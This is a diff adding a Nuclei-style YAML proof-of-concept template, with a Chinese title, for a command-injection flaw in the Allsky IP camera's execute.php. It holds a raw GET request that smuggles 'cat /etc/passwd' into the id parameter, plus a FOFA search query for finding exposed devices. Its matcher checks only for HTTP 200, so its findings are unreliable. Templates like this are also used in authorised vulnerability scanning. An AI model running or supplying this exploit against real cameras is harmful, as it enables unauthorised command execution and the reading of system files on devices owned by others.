@@ -1,0 +1,25 @@
+id: poc-bx585miymfl35exg
+info:
+  name: Allsky IP摄像头execute存在路径穿越导致命令注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bx585miymfl35exg'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bx585miymfl35exg
+    fofa: (icon_hash="-1842970372" && server=="Allsky") || title="Allsky Camera"
+http:
+- raw:
+  - 'GET /execute.php?id=allsky-config%20cat%20/etc/passwd HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
